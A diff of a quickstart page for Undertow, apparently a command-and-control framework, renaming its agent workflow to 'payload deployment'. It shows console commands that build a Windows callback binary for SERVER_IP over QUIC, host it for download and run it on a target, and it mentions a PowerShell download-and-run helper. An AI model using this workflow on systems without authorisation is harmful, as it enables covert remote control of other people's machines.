@@ -1,16 +1,16 @@
 # Quickstart
 
-## Configured agent artifact
+## Payload deployment
 
 Build the release binaries with `sh tools/build-release.sh bin` (or `tools/build-release.ps1` on Windows), then start the server. Its `bin` directory should contain the thin-agent templates. In the server console:
 
 ```text
-agent profile create office server=SERVER_IP:443 transport=quic
-agent build office windows amd64
-agent host ARTIFACT_ID
+payload profile create office server=SERVER_IP:443 transport=quic
+payload build office windows amd64
+payload host PAYLOAD_ID
 ```
 
-Use the random URL printed by `agent host` to retrieve the executable, verify the printed SHA-256, and run it on the target with **no agent arguments**. `agent deploy-script ARTIFACT_ID powershell` can print a small download-and-run helper. Confirm with `agents`, `use 1`, and `show`. `session kill` closes the session and permits reconnect; `agent shutdown` stops the configured process after acknowledgement. `agent unhost` disables download, `agent revoke` blocks future enrollment, and `agent delete` removes the server-side artifact record and file. Hosting requires the server's WebSocket HTTPS listener. See [configured thin agents](agent-distribution.md) for the full workflow and endpoint state.
+Use the **payload ID** printed by `payload build` for the host command. The **server file** path is where the binary is stored on the server; the random **download URL** printed by `payload host` is for the endpoint. `payload show PAYLOAD_ID` displays both, and `payload url PAYLOAD_ID` reprints the URL. Verify the printed SHA-256, then run the binary on the target with **no agent arguments**. `payload deploy-script PAYLOAD_ID powershell` prints a download-and-run helper. Confirm with `agents`, `use 1`, and `show`. `session kill` permits reconnect; `agent shutdown` stops the connected process. `payload unhost` disables download, `payload revoke` blocks future enrollment, and `payload delete` removes the server-side record and file. Hosting requires the server's WebSocket HTTPS listener. Type `payload` in either console for the workflow, or see [payload deployment](agent-distribution.md).
 
 Use **QUIC on UDP/443** for these examples. The server also listens on WebSocket TCP/443 and DNS UDP/53 by default. Open UDP/443 in the server firewall. Run commands from each host's Undertow directory; `./bin/undertow` is the built Linux binary. On Windows, use `.\bin\undertow.exe`. Replace `SERVER_IP`, `FINGERPRINT`, and the example network with your values.
 
